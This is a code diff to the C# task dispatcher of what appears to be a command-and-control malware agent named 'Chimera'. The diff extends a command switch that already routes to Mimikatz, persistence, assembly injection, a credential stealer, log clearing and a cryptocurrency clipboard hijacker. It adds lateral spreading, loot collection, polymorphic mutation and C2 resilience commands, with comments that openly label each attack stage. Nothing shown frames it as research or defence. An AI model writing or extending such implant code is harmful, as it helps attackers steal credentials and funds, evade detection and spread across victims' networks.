@@ -35,7 +35,8 @@ namespace Chimera
                 int arrEnd   = json.IndexOf("]", arrStart);
                 if (arrEnd - arrStart <= 1) return;
 
-                string tasksContent = json.Substring(arrStart + 1, arrEnd - arrStart - 1).Trim();
+                string tasksContent = json.Substring(arrStart + 1,
+                    arrEnd - arrStart - 1).Trim();
                 if (tasksContent.Length == 0) return;
 
                 string taskID     = ExtractJsonValue(tasksContent, "id");
@@ -49,6 +50,9 @@ namespace Chimera
 
                 switch (command.ToLower())
                 {
+                    // --------------------------------------------------------
+                    // Core
+                    // --------------------------------------------------------
                     case "shell":
                         output = Commands.Shell.Execute(parameters);
                         break;
@@ -77,6 +81,14 @@ namespace Chimera
                         output = Commands.Sleep.Execute(parameters);
                         break;
 
+                    case "kill":
+                        C2Http.PostResponse(CallbackUUID, taskID, "Agent terminating.");
+                        Environment.Exit(0);
+                        return;
+
+                    // --------------------------------------------------------
+                    // Recon / post-exploitation
+                    // --------------------------------------------------------
                     case "ps":
                         output = Commands.Ps.Execute();
                         break;
@@ -93,20 +105,36 @@ namespace Chimera
                         output = Commands.Mimikatz.Execute();
                         break;
 
+                    // --------------------------------------------------------
+                    // Persistence
+                    // --------------------------------------------------------
                     case "persist":
-                        output = (parameters != null && parameters.ToLower() == "remove")
+                        output = (parameters != null &&
+                                  parameters.Trim().ToLower() == "remove")
                             ? Commands.Persist.Remove()
                             : Commands.Persist.Execute();
                         break;
 
+                    case "persist2":
+                        output = Commands.Persist2.Execute(parameters);
+                        break;
+
+                    // --------------------------------------------------------
+                    // Injection / stealer
+                    // --------------------------------------------------------
                     case "inject_assembly":
-                        output = Commands.InjectAssembly.Execute(parameters, taskID, CallbackUUID);
+                        output = Commands.InjectAssembly.Execute(
+                            parameters, taskID, CallbackUUID);
                         break;
 
                     case "run_stealer":
-                        output = Commands.InjectAssembly.Execute("run_stealer", taskID, CallbackUUID);
+                        output = Commands.InjectAssembly.Execute(
+                            "run_stealer", taskID, CallbackUUID);
                         break;
 
+                    // --------------------------------------------------------
+                    // Evasion / elevation
+                    // --------------------------------------------------------
                     case "runas_exec":
                     case "bypass":
                         output = Commands.RunasExec.Execute(parameters);
@@ -116,18 +144,54 @@ namespace Chimera
                         output = Commands.ClearLogs.Execute();
                         break;
 
+                    // --------------------------------------------------------
+                    // Crypto hijacking
+                    // --------------------------------------------------------
                     case "clipper":
                         output = Commands.Clipper.Execute(parameters);
                         break;
 
+                    // --------------------------------------------------------
+                    // Lateral movement
+                    // --------------------------------------------------------
+                    case "spread":
+                        output = Commands.Spread.Execute(parameters);
+                        break;
+
+                    // --------------------------------------------------------
+                    // Loot collection
+                    // --------------------------------------------------------
+                    case "collect":
+                        output = Commands.Collect.Execute(taskID, CallbackUUID);
+                        break;
+
+                    // --------------------------------------------------------
+                    // Polymorphic mutation
+                    // --------------------------------------------------------
+                    case "mutate":
+                        output = Commands.Mutate.Execute(parameters);
+                        break;
+
+                    // --------------------------------------------------------
+                    // C2 resilience configuration
+                    // --------------------------------------------------------
+                    case "c2config":
+                        output = Commands.C2Config.Execute(parameters);
+                        break;
+
+                    // --------------------------------------------------------
+                    // Health check
+                    // --------------------------------------------------------
+                    case "check_health":
+                        output = Commands.CheckHealth.Execute();
+                        break;
+
+                    // --------------------------------------------------------
+                    // Help
+                    // --------------------------------------------------------
                     case "help":
                         output = Commands.Help.Execute();
                         break;
-
-                    case "kill":
-                        C2Http.PostResponse(CallbackUUID, taskID, "Agent terminating.");
-                        Environment.Exit(0);
-                        return;
 
                     default:
                         output = "Unknown command: " + command;
